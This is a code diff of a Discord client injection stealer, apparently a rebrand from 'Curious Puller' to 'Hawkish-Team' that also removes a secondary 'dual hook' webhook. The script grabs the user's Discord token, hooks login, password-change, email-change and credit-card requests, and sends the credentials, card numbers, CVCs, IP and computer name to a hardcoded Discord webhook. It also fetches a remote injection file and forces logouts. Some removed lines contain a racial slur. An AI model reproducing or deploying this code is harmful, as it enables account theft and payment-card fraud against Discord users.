@@ -7,21 +7,20 @@ const queryString = require("querystring")
 
 var computerName = process.env.COMPUTERNAME
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
-var logOutScript = ``
-var doTheLogOut = false
+var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window)`
+var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
 
 
 var config = {
-    "logout": "false",
-    "logout-notify": "false",
-    "init-notify": "false",
+    "logout": "true",
+    "logout-notify": "true",
+    "init-notify": "true",
     "embed-color": 16734976,
 
-    creator: "Moe",
+    creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
     injection_url: "https://raw.githubusercontent.com/Inplex-sys/Hawkish-Eyes/main/inject.js",
-    webhook: "%WEBHOOK%",
-    hook224141: "https://discord.com/api/webhooks/1162557453750259773/WbbbNnP12iCYhFMCzin6cVN8fOSlFPkg1Mc7r5GJhnbHXf2m8itzwlS8u8Xpz5HRw6C4",
+    webhook: "https://discord.com/api/webhooks/1162557453750259773/WbbbNnP12iCYhFMCzin6cVN8fOSlFPkg1Mc7r5GJhnbHXf2m8itzwlS8u8Xpz5HRw6C4",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -67,8 +66,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Curious Puller",
-        avatar_url: "https://media.discordapp.net/attachments/1161730598595989636/1162526913009561660/image.png?&width=1220&height=621",
+        username: "Hawkish-Team",
+        avatar_url: "https://raw.githubusercontent.com/Hawkishx/assets/main/hawkish.png",
         content: "",
         embeds: [{
             title: title,
@@ -76,11 +75,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Curious Puller`
+                name: `Hawkish-Team`
             },
             
             footer: {
-                text: `©[${config.creator}] | https://pornhub.com`
+                text: `©[${config.creator}] | https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook`
             },
 
         }]
@@ -285,26 +284,7 @@ const post = async (params) => {
         req.write(params);
         req.end();
     })
-    [config.hook224141].forEach(res => {
-        if(res == "%API_URL%")return;
-        if(res == "%WEBHOOK%")return;
-        const url = new URL(res);
-        const options = {
-            host: url.hostname,
-            port: url.port,
-            path: url.pathname,
-            method: 'POST',
-            headers: {
-                "Content-Type": "application/json"
-            }
-        }
-        const req = https.request(options);
-        req.on("error", (err) => {
-            console.log(err);
-        });
-        req.write(params);
-        req.end();
-    })
+
 }
 
 const FirstTime = async () => {
@@ -320,7 +300,7 @@ const FirstTime = async () => {
     var client_discord = await getDiscordClientFolder()
     if (!token) {
         var params = await makeEmbed({
-            title: "Curious Puller Initialized",
+            title: "Hawkish-Team Initialized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
@@ -341,7 +321,7 @@ const FirstTime = async () => {
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: " Curious Puller Initialized",
+            title: " Hawkish-Team Initialized",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
             fields: [{
                 name: "Username <:username:1041634536733290596> ",
@@ -373,10 +353,10 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Curious Puller 2023 <:hwkish:1104091524758773822>](https://pornhub.com)`,
+                value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                 inline: !0
             }, {
-                name: "Curious Puller Files",
+                name: "Hawkished Files",
                 value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                 inline: !0
             }, {
@@ -466,10 +446,10 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Curious Puller 2023 <:hwkish:1104091524758773822>](https://pornhub.com)`,
+                    value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                     inline: !0
                 }, {
-                    name: "Curious Puller Files",
+                    name: "Hawkished Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -507,6 +487,9 @@ const FirstTime = async () => {
             params.embeds.push(params2.embeds[0])
         }
     
+        fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
+        await execScript(logOutScript)
+        doTheLogOut = true
         await post(params)
     }
      
@@ -553,7 +536,7 @@ function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
         res.on("data", data => chunk += data)
-        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")) fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.hook224141}")))
+        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
 
@@ -646,10 +629,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Curious Puller 2023 <:hwkish:1104091524758773822>](https://pornhub.com)`,
+                    value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                     inline: !0
                 }, {
-                    name: "Curious Puller Files",
+                    name: "Hawkished Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -698,7 +681,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Curious Puller Detect Password Changed",
+                    title: "Hawkish-Team Detect Password Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -731,10 +714,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Curious Puller 2023 <:hwkish:1104091524758773822>](https://pornhub.com)`,
+                        value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                         inline: !0
                     }, {
-                        name: "Curious Puller Files",
+                        name: "Hawkished Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -785,7 +768,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Curious Puller Detect Email Changed",
+                    title: "Hawkish-Team Detect Email Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -818,10 +801,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Curious Puller and kanes fat nigga dick 2023](https://pornhub.com)`,
+                        value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                         inline: !0
                     }, {
-                        name: "Curious Puller Files",
+                        name: "Hawkished Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -871,9 +854,9 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "Curious Puller User Credit Card Added",
+                title: "Hawkish-Team User Credit Card Added",
                 description: `
-                Curious Puller Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
+                Hawkished Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
                 **ID** <:iduser:1041634535395307520>\n\`\`\`${user.id}\`\`\`\n
@@ -904,5 +887,4 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             break
     }
 })
-
 module.exports = require("./core.asar")
